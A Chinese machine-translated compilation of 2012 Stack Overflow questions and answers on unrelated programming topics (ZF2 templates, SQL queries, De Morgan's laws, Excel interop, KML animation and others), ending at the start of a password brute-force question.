我在 ZF2 中需要 2 个不同的模板映射，一个用于 admin 和 oen 用于前端，目前从我可以看到 ZF2 合并了在我配置的 2 个模块中使用的 2 个 module.config.php 文件，并导致模板映射我需要为管理员设置，也可以在前面的模块中加载。

/应用程序模块.config.php

```
...
'view_manager' => array(
        'display_not_found_reason' => true,
        'display_exceptions'       => true,
        'doctype'                  => 'HTML5',
        'not_found_template'       => 'error/404',
        'exception_template'       => 'error/index',
        'template_map' => array(
            'layout/layout'           => __DIR__ . '/../view/layout/layout.phtml',
            'application/index/index' => __DIR__ . '/../view/application/index/index.phtml',
            'error/404'               => __DIR__ . '/../view/error/404.phtml',
            'error/index'             => __DIR__ . '/../view/error/index.phtml',
        ),
        'template_path_stack' => array(
            __DIR__ . '/../view',
        ),
... 
```

/admin 模块.config.php

```
...
'view_manager' => array(
        'template_path_stack' => array(
            'admin' => __DIR__ . '/../view',
        ),
        'template_map' => array(
            'layout/layout'           => __DIR__ . '/../view/layout/layout.phtml',
        ),
    ),
... 
```

我应该修改什么以便我可以为 2 个单独的模块加载单独的“view_manager”数组？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-21T21:48:11.717

我是 ZF2 的新手，我也在寻找有关如何为仪表板、管理员和前端使用完全不同的模板的答案。

我`EdpModuleLayouts`按照这里和许多其他帖子的建议使用。这解决了问题的一个方面。布局。我现在能够为相同的模板提供不同的布局，如果我使用相同的模板或者想要证明忘记密码、注册或登录的不同布局，这将很有效。但我没有。我需要一组完全不同的文件夹、css 文件等。此时我可以将所有模板嵌套到一个模板文件夹中，并将布局文件中的链接指向适当的文件夹。但我也不想要这个。

我还将该`zfc-admin`模块包含在我的应用程序中，这给了我另一个方面的线索，即直接为文件提供不同的源。（之后卸载）

因此，通过将以下内容添加到我的`module_name/config/module.config.php`

```
'view_manager' => array(
        'template_path_stack' => array(
                __DIR__ . '/../view'
        ),
), 
```

启用并将以下代码添加到应用`EdpModuleLayouts`程序`application.config.php``module.config.php`

```
'module_layouts' => array(
    'Application' => 'layout/layout',
    'Dashboard' => 'layout/dashboard',
    'Admin' => 'layout/admin',
), 
```

这可能不是最好的方法，但它确实有效。这样做我真正看到的唯一问题是 EdpModuleLayouts 想要从`Application/view/layout`文件夹中提取所有布局。但是，它确实允许我将所有模块模板文件保留在正在处理的模块的视图部分中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T06:51:42.830

我也有这个问题。我采用了以下模块中提出的方法

[https://github.com/EvanDotPro/EdpModuleLayouts](https://github.com/EvanDotPro/EdpModuleLayouts)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-18T11:39:35.463

如果您能解释为什么要实现这一目标，那就太好了。正如我所看到的，您正在尝试为管理员设置不同的布局。也许你想看看这个模块已经可以做你正在尝试的事情[https://github.com/zf-commons/zfcadmin](https://github.com/zf-commons/zfcadmin)。这个模块有一个用于管理路由的布局设置。

# lucene - 如何提升 Lucene 方面？

> ID：13418740
> 
> 赞同：0
> 
> 时间：2012-11-16T14:38:14.657
> 
> 标签：lucene, faceted-search, facets

有没有办法在 Lucene 的方面添加一个增强因子？就像是：

```
List<CategoryPath> facetCategories = new ArrayList<CategoryPath>();
for (MyFeature f : allFeatures) {
    **Double boost = f.getBoost();** 
    facetCategories.add(new CategoryPath("feature", f.getName(), **bost**));
}
CategoryDocumentBuilder categoryDocBuilder = new CategoryDocumentBuilder(taxonomy);
categoryDocBuilder.setCategoryPaths(facetCategories); 
```

# javascript - Web 应用程序中的 Javascript 绑定的用户交互元素：一个还是按钮？

> ID：13418743
> 
> 赞同：0
> 
> 时间：2012-11-16T14:38:30.780
> 
> 标签：javascript, html, web-applications

大多数与 Web 应用程序中的自定义 JavaScript 行为相关的用户交互元素可以是`a`具有有意义的`href`属性值的 HTML 链接（元素），使它们能够在非 JavaScript 启用的环境中使用：

```
<a id="profile" href="profile">Profile</a>
<script>
  document.getElementById("profile").onclick = function() {
    return !open(this.href, "_blank", "scrollbars=no,status=no"); // whatever
  };
</script> 
```

但是一些交互元素与 JavaScript 有着很深的联系，要么是因为它们所包含的 Web 应用程序需要 JavaScript 才能运行，要么是因为它们是由 JavaScript 生成的，当它不可用时没有任何意义。

对于那些，因为我希望用户能够与他们在任何设备上进行交互（即我不想自己定义鼠标、键盘、触摸......在`span`元素上的交互），我看到两个相关的 HTML 元素：`a`和`button`。

我对`a`这里元素的问题是它至少定义了一种我不想要的行为：用户能够在任何他想要的地方打开其目标（例如在新标签中），而我想要进行的交互是特定于当前选项卡。

我对`button`这里元素的问题是，据我从在线资源中得知，很难在所有现代浏览器上可靠地设置样式（但我不确定现在是否仍然如此）。

这个问题的某些方面已经在其他地方得到了解答，但我找不到全面且最新的摘要：您建议使用什么 HTML 元素？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T14:55:55.353

如果您希望一个元素在语义上是一个按钮，而没有元素的样式问题`<button>`或元素的行为`<a href>`，那么您应该使用带有`[role="button"]`. `<span>`是常用的，但几乎可以使用任何元素。

```
<span role="button"></span> 
```

现在，`[role="button"]`它实际上只是辅助技术的标志，因此需要设置一些交互以作为按钮做出反应，但它们实际上很容易。

按钮（例如链接和表单元素）通常是可选项卡的。这并不总是必要的，例如如果已经为其设置了键盘快捷键。如果你想`<span>`在跳位顺序中，只需添加`[tabindex]`属性：

```
<span role="button" tabindex="0"></span> 
```

现在您可以`tab`使用按钮，但您可能仍希望在按下和/或按下`click`时触发事件。`Enter``Space`

只需向按钮添加一个事件侦听器就足够了。

[为简洁起见，此示例使用 jQuery：]

```
$(document).on('keydown', 'span[role="button"]', function (e) {
    if (e.which === 13 || e.which === 32) {
        $(this).click();
        e.preventDefault();
    }
}); 
```

这使用事件委托格式为具有 [role="button"] 的所有跨度提供点击支持，您可能希望根据您的情况选择不同的选择器。

现在剩下的就是在单击按钮时监听：

[再次，jQuery：]

```
$('.myButtonClass').click(function () {
    ...do stuff...
}); 
```

现在，对于其他设备，您将要触发点击，比如说，一个`touch`事件。如果您使用的是 jQuery，则有各种库支持转换`touch`为`click`和/或`tap`. 如果您不使用 jQuery，那么监听[`touch`事件](http://www.w3.org/TR/touch-events/)的工作量并不大。

我不会提供处理触摸的代码示例，但那是因为它取决于按钮应该做什么。*在某些情况下，*您只想通过开始触摸按钮来触发处理程序`mousedown`（相当于一般）。*`click`*

# android - 内存、CPU 和网络使用测量和比较工具

> ID：13418746
> 
> 赞同：1
> 
> 时间：2012-11-16T14:38:35.583
> 
> 标签：android

我的应用程序内容和功能齐全，我想分析真实的测试数据。恕我直言，DDMS 调试工具不是可靠的来源，您需要插入计算机并让调试器干预进行测试，这会导致测量失败。

哪些工具可用于分析应用程序消耗，并可能报告它并与旧版本进行比较？

# c# - WinRT 画布缩放

> ID：13418747
> 
> 赞同：1
> 
> 时间：2012-11-16T14:38:35.953
> 
> 标签：c#, xaml, winrt-xaml

我是winRT的新手，我正在尝试制作一个世界地图应用程序。
我有一个画布控件，里面有很多路径控件（每个路径控件都代表一个国家）
现在我想做一些东西，这样我就可以放大我的画布，所以我必须专注于而不是看到世界地图，因为例如，欧洲。
我认为，放大图像控件很容易，但是图像控件中不能有不同的路径控件。
有没有办法在画布控件上进行缩放行为或其他东西？
提前谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T23:41:14.067

您可以尝试将画布包含在 ScrollViewer 中：

```
<ScrollViewer MinZoomFactor="0.25" >
    <Canvas>
        <Canvas.Background>
            <ImageBrush x:Name="_background" />
        </Canvas.Background>
    </Canvas>
</ScrollViewer> 
```

...然后您可以将图像源分配给画布（在您的情况下为地图）。

# rotation - 桶形移位器的应用

> ID：13418748
> 
> 赞同：2
> 
> 时间：2012-11-16T14:38:39.297
> 
> 标签：rotation, hardware, shift, digital-logic

我正在做一个 VLSI 项目，我正在使用一个名为 DSCH 的工具来实现一个桶形移位器。同样的原理图是使用传输门实现的。

该电路的作用是，它在一个时钟周期内从解码器中选择尽可能多的旋转来旋转 8 位字（8 位移位器）。
但是我想知道旋转器的用途以及为什么即使它在旋转它仍然被称为移位器。

还请帮助我处理一些关于 Rotator 的应用程序，这些应用程序可以添加到当前电路中以显示它的用途？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T15:20:34.880

旋转只是移位从一端退出的位反馈到另一端的输入，可能通过进位标志位。在简单实现的层面上，两个操作都有一个电路是有意义的，并带有一些额外的控制线来选择另一侧的输出、0 或 1 之间的输入侧的源。右侧期间的符号扩展2 的补码移位将是另一个经常内置的可选选项。

stackexchange 网站并不真正适合“列出”包括有关应用程序在内的问题，但我想到了几个：

*   如果您希望一个向量依次测试另一个值的每一位，并重复执行此操作，您可以只将初始的一位有效值轮换一次，而不必重新初始化它。

*   您可以交换一个两部分（通常是双字节）值，以通过将其旋转一半来模仿编码的相反端性。或者换一种说法，它可以是两个可配对但也可独立访问的寄存器的值的单操作交换（想想 AL 和 AH 在实模式 x86 中共同构成 AX）。但这不起作用两个字节序交换一个四部分的值，例如字节寻址机器上的 32 位值。

*   各种编码、校验和和散列方案可能希望转换一个值

# php - SQL 结果来自不同领域的研究

> ID：13418753
> 
> 赞同：0
> 
> 时间：2012-11-16T14:39:06.770
> 
> 标签：php, mysql, sql

我有这个 SQL 表：

```
name  | id_photo
================
word1 | 38    
word2 | 38
word7 | 39
word1 | 31
word2 | 31 
```

我想研究所有的 id_photo，例如 name = word1 AND name = word2 例如这种情况我想作为回报 38,31

有人可以提出解决方案吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:40:45.727

```
SELECT ID_PHOTO
FROM tableNAME
WHERE name IN ('word1','word2')
GROUP BY ID_PHOTO
HAVING COUNT(*) = 2 
```

如果没有在每个名称上指定唯一键，请在内部`id_photo`使用`distinct``COUNT`

```
SELECT ID_PHOTO
FROM tableNAME
WHERE name IN ('word1','word2')
GROUP BY ID_PHOTO
HAVING COUNT(DISTINCT name) = 2 
```

*   [SQLFiddle 演示（*包括两个查询*）](http://sqlfiddle.com/#!2/c6377/1)

# sonarqube - (sonar with gallio and) opencover，代码覆盖率：0%

> ID：13418755
> 
> 赞同：3
> 
> 时间：2012-11-16T14:39:10.787
> 
> 标签：sonarqube, gallio, opencover

我正在使用使用 OpenCover 的 Gallio 声纳，尽管有测试类并且我的机器需要大约 15 秒来尝试运行测试（至少看起来是这样），但它给了我 0% 的代码覆盖率，之后他们'用线来概括`0 run, 0 passed, 0 failed, 0 inconclusive, 0 skipped`。所以，我浏览了互联网/stackoverflow，发现这可能与在另一台机器上编译的代码有关。就像这里的情况一样，我在 Visual Studio 中打开了解决方案，构建了它，我可以看到我的 PDB 文件被重新创建。之后，我再次尝试使用 opencover 声纳。它没有帮助

我从管理控制台中取出调用 OpenCover 的代码行，进入 OpenCover 目录并执行同一行，没有过滤器，因为我的 coverage-report.xml 告诉我测试模块是`skippedDueTo="Filter"`. 之后他们不再被跳过。尽管如此，0% 的测试覆盖率

我在同一个管理控制台中注册了 OpenCover 分析器库`regsvr32 OpenCover.Profiler.dll`（并尝试了两次，因为我在 Windows 7 上但使用的是 32 位声纳）。没有帮助

我尝试了添加 -oldStyle 参数的同一行也没有帮助

现在我觉得我没有选择...

我在管理控制台中尝试的最新调用：

```
C:\Program Files\OpenCover>OpenCover.Console.exe -register:user -target:"C:\Program Files\Gallio\bin\Gallio.Echo.exe" -targetdir:D:\projecten\udbdrm\source\CDP\CDPBackoffice\Develop\CDPBackoffice.root\CDPBackoffice\.sonar "-targetargs:\"/r:IsolatedAppDomain\" \"/report-directory:D:\projecten\udbdrm\source\CDP\CDPBackoffice\Develop\CDPBackoffice.root\CDPBackoffice\.sonar\" \"/report-name-format:gallio-report\" \"/report-type:Xml\" \"D:\projecten\udbdrm\source\CDP\CDPBackoffice\Develop\CDPBackoffice.root\CDPBackoffice\CDPBackoffice.BusinessLogic.Tests\bin\Debug\CDPBackoffice.BusinessLogic.Tests.dll\" \"D:\projecten\udbdrm\source\CDP\CDPBackoffice\Develop\CDPBackoffice.root\CDPBackoffice\CDPBackoffice.Utility.Tests\bin\Debug\CDPBackoffice.Utility.Tests.dll\" \"D:\projecten\udbdrm\source\CDP\CDPBackoffice\Develop\CDPBackoffice.root\CDPBackoffice\CDPBackoffice.DataAccessLayer.Tests\bin\Debug\CDPBackoffice.DataAccessLayer.Tests.dll\"" -mergebyhash -output:D:\projecten\udbdrm\source\CDP\CDPBackoffice\Develop\CDPBackoffice.root\CDPBackoffice\.sonar\coverage-report.xml -oldStyle 
```

该解决方案确实有几个测试类，它们在 Visual Studio 中执行它们时运行，它们确实调用源类。他们中的一些人失败了一些人成功了。

任何人仍然对如何获得测试结果有所了解？最好在声纳中，但是，嘿，因为使用上面的调用执行 OpenCover 会将结果放在 coverage-report.xml 中，而声纳使用它作为输入，我对工作调用很好......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-19T09:56:04.010

显然，我需要添加到 sonar-project.properties 的只是这一行： `sonar.gallio.runner=IsolatedProcess`

# javascript - 点分隔 ID 到嵌套对象中

> ID：13418756
> 
> 赞同：0
> 
> 时间：2012-11-16T14:39:18.860
> 
> 标签：javascript

如果没有某种例子，这很难解释，所以我很抱歉这个奇怪的标题。

我有一个充满数据的 JSON 对象。其中一些数据是相关的，但它们都在一个对象中，而不是嵌套的。判断对象是否嵌套的唯一方法是查看 ID 字段。

示例 ID：

```
[0] => Item_1
[1] => Item_1.Item_1a
[2] => Item_1.Item_1a.Item_1b
[3] => Item_2
[4] => Item_2.Item_2a
[5] => Item_3

// 0 is a root item
// 1 would belong to 0
// 2 would belong to 1
// 3 is a root item
// 4 would belong to 3
// 5 is a root item 
```

我想要结束的是

```
[0] => Item_1->subAttributes = [0] => Item_1a, [1] => Item 1b
[1] => Item_2->subAttributes = [0] => Item_2a
[2] => Item_3 // Since it has no sub attributes I want to remove it. 
```

我尝试了几种不同的方法，我可以轻松地嵌套一层，但不止一层，我就会迷路。

我试过循环遍历属性，拆分 ID `.`，然后循环遍历 ID 部分以对它们进行排序，但我被卡住了。我正在尝试在 JS 中执行此操作。

到目前为止，这是我尝试过的所有内容……有些被注释掉了，因为它工作不正常，我尝试了不同的方向。

```
function getNestedAttributes(attrs)
{
    var nested = [],
        nestedTmp = 0,
        subAttributes = [],
        currIndex = 0;
        subIndex = 0;

    for ( var i=0; i<attrs.length; i++ )
    {
        // splitId returns an array of elements split by .
        var idLevels = splitId(attrs[i].id),
            flag = false,
            tempObj = {};

        for ( var n=0; n<idLevels.length; n++ )
        {
            // console.log(attrs[i]);

            // array_key_exists is a JS function made to mimic php's array_key_exists
            if ( ! array_key_exists(idLevels[n], nested) )
            {
                // console.log(idLevels[n], 'is new');
                if ( ! flag )
                {
                    console.log(idLevels[n], attrs[i].name);
                    nested[idLevels[n]] = attrs[i];
                }
                else
                {
                    // console.log('FLAG!', idLevels[n], attrs[i].name);
                    console.log(nested[flag]);
                }
            }
            else
            {
                // console.log(idLevels[n], 'is not new');
                flag = idLevels[n];
            }
        }

        // if ( idLevels.length == 1 )
        // {
        //  // Parent Item
        //  currIndex = nested.push(attrs[i]);
        //  subAttributes = [];
        // }
        // else
        // {
        //  if ( idLevels.length > 2 )
        //  {
        //      // nestedTmp = nested[currIndex-1][subIndex];
        //      // subAttributes.push(attrs[i]);
        //      console.log(attrs[i].name);
        //  }
        //  else
        //  {
        //      nestedTmp = nested[currIndex-1];
        //      // subAttributes.push(attrs[i]);
        //  }

        //  subAttributes.push(attrs[i]);
        // }

        // // nested[currIndex-1].subAttributes = subAttributes;
        // nestedTmp.subAttributes = subAttributes;
    }

    //console.log(nested);
} 
```

# c++ - eclipse cdt 不喜欢类成员初始化器

> ID：13418768
> 
> 赞同：4
> 
> 时间：2012-11-16T14:39:41.440
> 
> 标签：c++, c++11, eclipse-cdt

我正在使用 Eclipse CDT 8.1.1

问题是，当使用 C++11 类成员初始化器时，它抱怨成员未初始化。它仍然需要一个初始化列表。

```
class Foo {
public:
  Foo() {} // warning: Member `m_bar` was not initialized in this constructor
 private:
  int m_bar = 0;
}; 
```

对此我能做些什么吗？

# sql - 优化SQL查询sql

> ID：13418774
> 
> 赞同：0
> 
> 时间：2012-11-16T14:40:14.190
> 
> 标签：sql, performance, sql-server-2008, tsql

我还需要帮助加快这个查询，在 LIVE db 上需要 25 分钟，在 TEST db 上需要 1 秒。

这是经过一些修改后，最初我查询数据库服务器数百次以使用主查询的每一行的 while 循环从 php 页面获取数据，然后我尝试使用临时表创建一个程序来返回数据，我在 45 分钟后取消了执行。所以我尝试了这个。

我想可以对“从 NurQueryResults 中选择前 1 个”查询进行内部连接，但我无法弄清楚。我得到了结果，但不是最近的结果，我做了一个“按 t1.time、t2.time、t3.time 排序......”虽然它确实有 t1 最近的结果在顶部，但它返回了更多的结果比它应该有的。

```
SELECT o.VisitID                                          AS VisitID,
       (SELECT TOP 1 Response
        FROM   NurQueryResults
        WHERE  QueryID = 'OEDTCAT'
               AND VisitID = o.VisitID
        ORDER  BY DateTime DESC)                          AS PPN,
       (SELECT TOP 1 Response
        FROM   NurQueryResults
        WHERE  QueryID = 'OEDTMEAT'
               AND VisitID = o.VisitID
        ORDER  BY DateTime DESC)                          AS MEAT,
       (SELECT TOP 1 Response
        FROM   OeOrderQueries
        WHERE  QueryID = 'OESPMOD'
               AND VisitID = o.VisitID
        ORDER  BY RowUpdateDateTime DESC)                 AS SPMOD,
       (SELECT TOP 1 Response
        FROM   OeOrderQueries
        WHERE  QueryID = 'OERT3'
               AND VisitID = o.VisitID
        ORDER  BY RowUpdateDateTime DESC)                 AS SPMOD2,
       (SELECT TOP 1 Response
        FROM   NurQueryResults
        WHERE  QueryID = 'OEDTDECUB'
               AND VisitID = o.VisitID
        ORDER  BY DateTime DESC)                          AS DECUB,
       (SELECT TOP 1 Response
        FROM   NurQueryResults
        WHERE  QueryID = 'OEALL2'
               AND VisitID = o.VisitID
        ORDER  BY DateTime DESC)                          AS FOODALL,
       o.OrderedProcedureName,
       o.OrderDateTime,
       a.RoomID,
       a.BedID,
       a.Name,
       a.Sex,
       DATEDIFF(year, a.ComputedBirthDateTime, GETDATE()) AS Age
FROM   OeOrders o
       INNER JOIN AdmVisits a
         ON o.VisitID = a.VisitID
            AND o.Category = 'DIET'
            AND o.StatusChoice = 'S'
            AND a.Status = 'ADM IN'
ORDER  BY o.VisitID,
          o.OrderDateTime DESC 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-30T23:48:31.393

打开执行计划并查看结果。它可能表明您缺少索引或类似性质的东西。说到索引，检查所涉及索引的碎片，如果它们很高，请考虑重建它们。我最近取得了相当大的成功，通过遵循上述过程，在生产中运行需要 2 分钟的程序在 1-3 秒内执行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:59:52.880

我只是想知道，当您执行以下操作时，结果会如何：

```
SELECT
    o.VisitID AS VisitID,
    PPN.Response
FROM OeOrders o
JOIN AdmVisits a
    ON o.VisitID = a.VisitID
    AND o.Category = 'DIET'
    AND o.StatusChoice = 'S'
    AND a.Status = 'ADM IN'
join
(
    SELECT 
        Response, 
        VisitID, 
        ROW_NUMBER() OVER(ORDER BY DateTime DESC) AS MyRowNumber 
    FROM NurQueryResults 
    WHERE QueryID = 'OEDTCAT'
) AS PPN
    on o.VisitID = PPN.VisitID
    and PPN.MyRowNumber = 1 
```

这不是您的整个查询，而只是获取列 PPN 的第一个子查询。

如果像这个 JOIN 一样更改所有子查询，它是否有任何性能提升？

# boolean - 仅使用 AND 布尔运算的转换函数

> ID：13418775
> 
> 赞同：8
> 
> 时间：2012-11-16T14:40:13.890
> 
> 标签：boolean, logic, boolean-logic, boolean-expression, boolean-operations

我有一些功能

```
(A and ( B or c)) or (D and E and (F or H or R or P ))) 
```

我想将该函数转换为仅使用和操作的函数（当然，如果可能的话）我发现使用[德摩根定律](http://en.wikipedia.org/wiki/De_Morgan%27s_laws)可以进行某种转换，但我没有设法将这个函数转换为任何想法？

我知道那个功能

```
!(A or B) is equal to function !A and !B 
```

但我找不到与上述功能相同的功能

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-16T15:05:39.693

你提到的功能：

```
!(A or B) = !A and !B 
```

是相同的：

```
A or B = !(!A and !B) 
```

因此，让我们首先将您的问题分为 ABC 和 DEFHRP 两部分。

```
(A and (B or C)) = (A and !(!B and !C))
(D and E and (F or H or R or P)) = (D and E and !(!F and !H and !R and !P)) 
```

由于这两个部分由“或”连接，我们可以再次应用等价得到：

```
!(!(A and !(!B and !C)) and !(D and E and !(!F and !H and !R and !P))) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:49:19.467

```
a and (b or c) 
```

是相同的

```
a and not (not b and not c) 
```

你可以[在这里测试](http://coffeescript.org/#try%3aa%20%3D%20true%0Ab%20%3D%20false%0Ac%20%3D%20false%0A%0Ad%20%3D%20a%20and%20%28b%20or%20c%29%0A%0Aalert%20d%0A%0Ae%20%3D%20a%20and%20not%20%28not%20b%20and%20not%20c%29%0A%0Aalert%20e)

* * *

对于更复杂的：

```
d and e and (f or h or r) 
```

是相同的

```
d and e and not(not f and not h and not r) 
```

[在这里](http://coffeescript.org/#try%3aa%20%3D%20true%0Ab%20%3D%20true%0Ac%20%3D%20true%0A%0Ad%20%3D%20a%20and%20%28b%20or%20c%29%0Ae%20%3D%20a%20and%20not%20%28not%20b%20and%20not%20c%29%0A%0Af%20%3D%20false%0Ah%20%3D%20false%0Ar%20%3D%20false%0A%0Ax%20%3D%20d%20and%20e%20and%20%28f%20or%20h%20or%20r%29%0Az%20%3D%20d%20and%20e%20and%20not%28not%20f%20and%20not%20h%20and%20not%20r%29%0A%0Aalert%20x%0Aalert%20z)测试

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:51:16.880

您正在寻找的关键替换是`A OR B => !(!A AND !B)`. 使用它可以扩展表达式。

# c# - Excel 插入行（不是添加）

> ID：13418776
> 
> 赞同：4
> 
> 时间：2012-11-16T14:40:16.557
> 
> 标签：c#, .net, excel, c#-4.0

我有一个采购订单的 Excel '07 模板文件。在模板上，只有 3 行项目的空间，然后模板显示总计。

所以，基本上，在模板中它有：第 19 行 - 第 20 行项目 - 第 21 行项目 - 第 22 行项目 - 项目总数

显然，大多数购买都会有超过 3 件商品。那么，在打印出 3 个项目之后，我将如何在 21 和 22 之间*插入一行？*

编辑; 所以这就是我所拥有的：

```
 xlApp.Workbooks.Open(template, misValue, misValue, misValue, 
                misValue, misValue, misValue, misValue, misValue, misValue, 
                misValue, misValue, misValue, misValue, misValue); 

int row = 19;
if (poDetailBO1.MoveFirst())
            {
                do
                {
                    itemsBO3.FillByPK(poDetailBO1.Style);
                    if (row < 22)
                    {

                        xlApp.Cells[row, 1] = poDetailBO1.LineNo;
                        xlApp.Cells[row, 2] = itemsBO3.Factory;
                        xlApp.Cells[row, 3] = poDetailBO1.Style;
                        xlApp.Cells[row, 4] = itemsBO3.UPC_Code;
                        xlApp.Cells[row, 5] = itemsBO3.Item_Description;
                        xlApp.Cells[row, 6] = "TARRIFF"; //To be replaced later
                        xlApp.Cells[row, 7] = itemsBO3.Plate_Color;
                        xlApp.Cells[row, 8] = itemsBO3.Color;
                        xlApp.Cells[row, 9] = poDetailBO1.PrePack;
                        xlApp.Cells[row, 10] = itemsBO3.Cost;
                        xlApp.Cells[row, 11] = poDetailBO1.Qty;
                        xlApp.Cells[row, 12] = poDetailBO1.Qty * itemsBO3.Cost;

                        row++;
                    }
                    else if (row >= 22)
                    {
                        Excel.Range r = xlWorkSheet.Range[xlWorkSheet.Cells[row, misValue], xlWorkSheet.Cells[row, misValue]];
                        r.Insert(Excel.XlInsertShiftDirection.xlShiftDown, misValue);
                        r.Value2 = "GOBBLYDEEGOOK";

                        row++;
                    }
                } while (poDetailBO1.MoveNext()); 
```

但是，我的插入被插入到错误的工作表中，哈哈。而不是我什至想象它被插入的地方——第 2 行，第 19 列。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-16T16:54:32.343

首先，我看不到你在哪里设置你的`xlWorksheet`，但那将是我首先要检查的地方，看看为什么你的单元格被插入到错误的工作表上。

其次，我认为您的`Excel.Range`对象设置不正确。您可能会遇到麻烦，因为您只在属性中指定行号`WorkSheet.Cells`而不是列名。当我尝试在使用的单元格范围之后插入单元格时，而不是在我想要的位置。我倾向于使用对象的`get_Range()`方法，`Worksheet`因为它通常以更可预测的方式工作。

鉴于所有这些，根据您是希望特定单元格向下移动还是整个行，您可以使用以下之一：

```
// To shift down a set of cells from columns A to F

Excel.Range r = xlWorkSheet.get_Range("A" + row.ToString(), "F" + row.ToString());
r.Insert(Excel.XlInsertShiftDirection.xlShiftDown);

// To shift down all of a row

Excel.Range r = xlWorkSheet.get_Range("A" + row.ToString(), "A" + row.ToString()).EntireRow;
r.Insert(Excel.XlInsertShiftDirection.xlShiftDown); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T19:25:05.450

直到午休后我才看到 Sid Holland 的帖子，一位同事发给我的代码与他的基本相同......

```
 private void CopyRowsDown(int startrow, int count, Excel.Range oRange, Excel.Worksheet oSheet)
    {
        oRange = oSheet.get_Range(String.Format("{0}:{0}", startrow), System.Type.Missing);
        oRange.Select();
        oRange.Copy();
        //oApp.Selection.Copy();

        oRange = oSheet.get_Range(String.Format("{0}:{1}", startrow + 1, startrow + count - 1), System.Type.Missing);
        oRange.Select();
        oRange.Insert(-4121);
        //oApp.Selection.Insert(-4121);

    } 
```

即使计数为 1，也能完美运行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-08-29T12:13:33.530

```
public static void CopyRowsDown(_Worksheet worksheet, int startRowIndex, int countToCopy)
    {
        for (int i = 1; i < countToCopy; i++)
        {
            var range = worksheet.get_Range(string.Format("{0}:{0}", startRowIndex, Type.Missing));
            range.Select();
            range.Copy();

            range = worksheet.get_Range(string.Format("{0}:{1}", startRowIndex + i, startRowIndex + i, Type.Missing));
            range.Select();
            range.Insert(-4121);
        }
    } 
```

适用于任何计数

# kml - 使用 kml 在 Google 地球中为线条制作动画

> ID：13418779
> 
> 赞同：5
> 
> 时间：2012-11-16T14:40:22.983
> 
> 标签：kml, google-earth

我非常擅长使用`animated update`谷歌地球的功能，并且正在使用它来移动`models`。我真正想做的是能够`line`在谷歌地球中为一个（例如上下）设置动画，但我发现这很棘手。

我在开始时有这条线的经度和纬度。例如线坐标是：

> -88,17,100 -88.20270841086835,17.21899813162266,100

然后我想在`raise`5 秒内将这条线的一端上升到 500 的高度。

我已经使用`LineString`：

```
<Placemark id="path1">
    <name>Untitled Path man</name>
    <LineString>
        <tessellate>1</tessellate>
        <coordinates>
            -88.,17,100 -88.20270841086835,17.21899813162266,100 
        </coordinates>
    </LineString>
</Placemark> 
```

但是我现在不知道如何使用`<gx:AnimatedUpdate>`将一端从 100 移动到 500。

我确定这很容易 - 有人能指出我正确的方向吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-16T20:17:24.110

诀窍是更新 LineString 元素（上面带有 id）而不是 Placemark。

这是一个有效的 KML 示例导览，它对从 100 到 500m 的相对高度变化的线进行动画处理。

```
<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2" xmlns:gx="http://www.google.com/kml/ext/2.2">
    <Document>
        <name>gx:AnimatedUpdate example</name>
        <open>1</open>

        <LookAt>
            <longitude>-88.1351880996469</longitude>
            <latitude>17.09943637744042</latitude>
            <altitude>0</altitude>
            <heading>49.91874373078863</heading>
            <tilt>84.43764019949967</tilt>
            <range>1929.311316966288</range>
            <gx:altitudeMode>relativeToSeaFloor</gx:altitudeMode>
        </LookAt>

        <Placemark>
            <name>Untitled Path man</name>
            <LineString id="path1">
                <tessellate>1</tessellate>
                <altitudeMode>relativeToGround</altitudeMode>
                <coordinates>
            -88,17,100 -88.20270841086835,17.21899813162266,100
                </coordinates>
            </LineString>
        </Placemark>

        <gx:Tour>
            <name>Play me!</name>
            <gx:Playlist>
                <gx:AnimatedUpdate>
                    <gx:duration>5</gx:duration>
                    <Update>
                        <targetHref/> <!-- Left empty to refer to the current file -->
                        <Change>                          
                            <LineString targetId="path1">
                                <coordinates>
                                    -88,17,100 -88.20270841086835,17.21899813162266,500             
                                </coordinates>                          
                            </LineString>
                        </Change>
                    </Update>
                </gx:AnimatedUpdate>

                 <!-- Wait for the animation to complete (see the touring
                 tutorial for an explanation of how AnimatedUpdate's
                 duration isn't enough to guarantee this). -->
                <gx:Wait>
                  <gx:duration>5.0</gx:duration>
                </gx:Wait>
            </gx:Playlist>
        </gx:Tour>
    </Document>
</kml> 
```

有关详细信息，请参阅[https://developers.google.com/kml/documentation/touring#tourtimelines](https://developers.google.com/kml/documentation/touring#tourtimelines)

# security - 这个密码生成算法容易受到暴力攻击吗？

> ID：13418780
> 
> 赞同：2
> 
> 时间：2012-11-16T14:40:27.747
> 
> 标签：security, brute-force

我想我有一种新方法可以创建很难破解的密码。假设你有你的密码，一些简单的词，比如“security”或短语“cantHackMe”。当然，这些密码很容易被暴力破解。因此，如果您将它留在某个地方并且它们只是 md5 散列，则使用字典很容易用暴力破解它们。

如果您正在考虑更长的密码，例如 20 个字母 - 天哪，这很难记住。如果您有一个易于记忆的随机密码，并且可以将您的安全性与它结合起来，该怎么办？

